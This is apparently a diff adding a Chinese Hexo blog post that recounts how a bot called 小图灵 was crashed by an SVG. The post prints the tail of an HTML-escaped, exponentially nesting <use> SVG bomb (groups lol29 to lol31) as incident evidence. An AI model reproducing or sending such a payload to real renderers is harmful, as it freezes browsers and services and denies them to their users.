+        &lt;\use x&#x3D;&quot;3.6219064295651027&quot; y&#x3D;&quot;89.20903737118047&quot; xlink:href&#x3D;&quot;#lol28&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol30&quot;&gt;
+        &lt;\use x&#x3D;&quot;51.105091550849394&quot; y&#x3D;&quot;7.222665158972252&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.821227415787703&quot; y&#x3D;&quot;37.62624098644449&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.288636539856846&quot; y&#x3D;&quot;7.362812763367921&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.58026626887818&quot; y&#x3D;&quot;23.608769064171298&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.522543116087105&quot; y&#x3D;&quot;69.34436312999898&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.803121712246&quot; y&#x3D;&quot;42.63451899655048&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.767408188223175&quot; y&#x3D;&quot;40.8381179906912&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.03531276907356&quot; y&#x3D;&quot;93.65765886005866&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.118616254343976&quot; y&#x3D;&quot;1.5225668721275731&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;54.848509635576036&quot; y&#x3D;&quot;7.202998777615377&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.112591547483866&quot; y&#x3D;&quot;51.039192967938774&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;16.22540050077105&quot; y&#x3D;&quot;22.481717925009914&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.54028961417194&quot; y&#x3D;&quot;94.48057882390371&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.02626793746228&quot; y&#x3D;&quot;31.037111961028863&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.602968446532472&quot; y&#x3D;&quot;65.25186905115567&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.55352211958389&quot; y&#x3D;&quot;44.7700305492426&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;52.643369455080034&quot; y&#x3D;&quot;14.056602751692838&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.66740734235955&quot; y&#x3D;&quot;70.49258562944425&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.402905117192375&quot; y&#x3D;&quot;70.03963822256667&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.55743147240483&quot; y&#x3D;&quot;90.90232201967062&quot; xlink:href&#x3D;&quot;#lol29&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol31&quot;&gt;
+        &lt;\use x&#x3D;&quot;96.82307939588063&quot; y&#x3D;&quot;25.48294418122322&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.8990448959419&quot; y&#x3D;&quot;16.434905531709198&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.615618815381676&quot; y&#x3D;&quot;51.268912238711&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.90441480628951&quot; y&#x3D;&quot;18.371409224010847&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.12632185693845&quot; y&#x3D;&quot;77.1865506163019&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;28.399481860881583&quot; y&#x3D;&quot;1.6676762282063273&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;54.75254797035988&quot; y&#x3D;&quot;86.33962744376517&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;45.691943094694246&quot; y&#x3D;&quot;68.18587056869542&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.427595361883753&quot; y&#x3D;&quot;56.76892009799677&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.47753119061485&quot; y&#x3D;&quot;58.935825170838406&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.68822299106176&quot; y&#x3D;&quot;20.855758330108976&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.23869738937427&quot; y&#x3D;&quot;4.5731189397903&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.928181888843902&quot; y&#x3D;&quot;43.13507465952826&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.47987839928615&quot; y&#x3D;&quot;28.51815188869711&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;52.24622651494635&quot; y&#x3D;&quot;64.96905251470798&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.93958026357068&quot; y&#x3D;&quot;32.69381511295465&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;17.42390621691773&quot; y&#x3D;&quot;0.2631356983407329&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;31.04399842768888&quot; y&#x3D;&quot;43.68727370965419&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.72096497176157&quot; y&#x3D;&quot;89.20433431378848&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.791657251197202&quot; y&#x3D;&quot;57.56619697329013&quot; xlink:href&#x3D;&quot;#lol30&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\&#x2F;svg&gt;</code></pre>
+
+</details>
+
+<p>为了以防万一，所有我都转义了一下  O(∩_∩)O<code>&lt;</code></p>
+<p>大家一看就知道，这张图超超超超超超超超级大，反转愣是把浏览器卡死了</p>
+<details>
+  <summary>此处对冰梨说句话</summary>
+  你这个svg在我写md的时候复制过来结果被渲染了WTF，***，结果vscode自动保存也崩了于是就没保存,\*\*\*(优美中国话)
+
+</details>
+
+<h2 id="对小图灵的话"><a href="#对小图灵的话" class="headerlink" title="对小图灵的话"></a>对小图灵的话</h2><p>小图灵的开发者们：摸鱼一时爽，摸完要遭殃，记得写篇技术还债</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">打赏</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://img.wuyuan.dev/wxzf.png"><img loading="lazy" src="https://img.wuyuan.dev/wxzf.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>孙悟元</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://wuyuan.dev/2022/08/01/xiaotulingsvg/" title="2022,小图灵是这样崩的">http://wuyuan.dev/2022/08/01/xiaotulingsvg/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\n本文作者：孙悟元\n本文链接：http://wuyuan.dev/2022/08/01/xiaotulingsvg/\n版权声明：本博客所有文章除特别声明外，均默认采用 CC BY-NC-SA 4.0 许可协议。');
+  }
+});</script></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/08/06/xiaotulingshuaping/" rel="prev" title="2022,小图灵又一次的刷屏"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2022,小图灵又一次的刷屏</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/01/01/hello-world/" rel="next" title="Hello World"><span class="post-nav-text">Hello World</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2022/08/01/xiaotulingsvg/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2022 – 2023 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 孙悟元</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.9</span></div><div class="footer-custom-text"><br/>使用本站视为同意 <a href="https://wuyuan.dev/privacy-policy/" rel="noopener" target="_blank">隐私政策</a><a>  </a><a href="https://icp.gov.moe/?keyword=20220591" target="_blank">萌ICP备20220591号</a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
